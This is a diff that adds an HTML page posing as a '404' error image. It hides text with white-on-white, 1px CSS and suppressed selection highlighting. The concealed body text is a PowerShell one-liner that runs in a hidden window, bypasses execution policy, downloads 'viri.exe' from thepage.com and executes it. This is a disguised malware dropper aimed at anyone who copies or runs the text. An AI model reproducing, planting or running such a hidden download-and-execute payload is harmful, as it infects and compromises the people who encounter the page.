@@ -1,0 +1,26 @@
+<html>
+<style>
+::-moz-selection {
+color: white;
+background: white;
+}
+::selection {
+color: white;
+background: white;
+}
+body{
+color: white;
+background: white;
+font-size: 1px;
+}
+img {
+max-width: 100%;
+height: auto;
+}
+</style>
+<body>
+powershell.exe -NoProfile -WindowStyle hidden -ExecutionPolicy Bypass -Command Start-BitsTransfer -Source "https://thepage.com/viri.exe" https://thepage.com/viri.exe%22 -Destination "c:\programdata\viri.exe"; C:\programdata\viri.exe
+<center><img src="404.png"></img></center>
+</body>
+</html>
+
